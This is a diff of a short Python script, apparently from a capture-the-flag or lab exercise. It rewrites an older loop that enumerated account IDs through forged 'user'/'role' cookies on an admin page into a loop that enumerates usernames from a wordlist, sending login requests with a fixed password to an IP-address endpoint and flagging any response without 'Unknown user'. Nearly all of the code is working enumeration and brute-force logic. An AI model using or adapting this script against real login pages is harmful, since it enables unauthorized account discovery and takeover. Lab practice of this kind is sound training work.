@@ -1,9 +1,11 @@
 #!/usr/bin/env python3 
 
 '''
-Author: Zachary Bowditch (Edargorter)
-Date: 2020
-Reason: Otherwise another week would have gone by, and I still wouldn't know how to send http headers with Python.
+
+    Author: Zachary Bowditch (Edargorter)
+    Date: 2020
+    Reason: Otherwise another week would have gone by, and I still wouldn't know how to send http headers with Python.
+
 
 '''
 
@@ -40,6 +42,7 @@ def parse_headers(header_lines):
         headers[hl[:delimiter]] = hl[delimiter + 1:].strip()
     return headers
 
+'''
 access_id = 34322
 role = "admin"
 user_id = 0
@@ -69,11 +72,16 @@ f.write(response)
 f.close()
 #os.system("chrome temp.html")
 
+'''
+
 #Accounts 
-url = "http://10.10.10.28/cdn-cgi/login/admin.php"
-request_file = "accounts_headers.txt"
-params = {"content": "accounts", "id":"{}".format(account_id)}
-cookies = {"user":"{}".format(access_id), "role":"{}".format(role)}
+#url = "http://10.10.10.28/cdn-cgi/login/admin.php"
+url = "http://34.94.3.143/8cbc81c2e9/login"
+request_file = "temp.req"
+bruteforce_file = "bf.txt"
+password = "password"
+params = {"username": "{}".format("admin"), "password":"{}".format(password)}
+#cookies = {"user":"{}".format(access_id), "role":"{}".format(role)}
 
 try:
     lines = open(request_file, 'r').readlines()
@@ -81,24 +89,35 @@ except Exception as e:
     print(e)
     exit(1)
 
+#Open bruteforce file 
+try:
+    blines = [x.strip().rstrip() for x in open(bruteforce_file, 'r').readlines()]
+except Exception as e:
+    print(e)
+    exit(1)
+
+print(lines)
 headers = parse_headers(lines)
 
-headers = {}
-r = requests.get(url, cookies=cookies, params=params)
-response = r.content.decode("utf-8")
+#r = requests.get(url, params=params)
+#response = r.content.decode("utf-8")
 found = False 
 
 #Loop until we get correct response 
-while not found:
-    account_id += 1
-    print(account_id)
-    params = {"content": "accounts", "id":"{}".format(account_id)}
-    r = requests.get(url, cookies=cookies, params=params)
+for user in blines:
+    #account_id += 1
+    #print(account_id)
+    #params = {"content": "accounts", "id":"{}".format(account_id)}
+    print("Testing {}".format(user), end=" ")
+    params = {"username": "{}".format(user), "password":"{}".format(password)}
+    r = requests.get(url, params=params)
     response = r.content.decode("utf-8")
-    found = False if response.find("super") == -1 else True 
+    found = True if response.find("Unknown user") == -1 else False #Search for unique string in correct response 
+    if not found:
+        print("True", end="")
+    print()
     
-print("Found Access ID for Superadmin")
-print(account_id)
-f = open("found_.http", "w")
-f.write(response)
-f.close()
+#print("Found Access ID for Superadmin")
+#f = open("found_.http", "w")
+#f.write(response)
+#f.close()
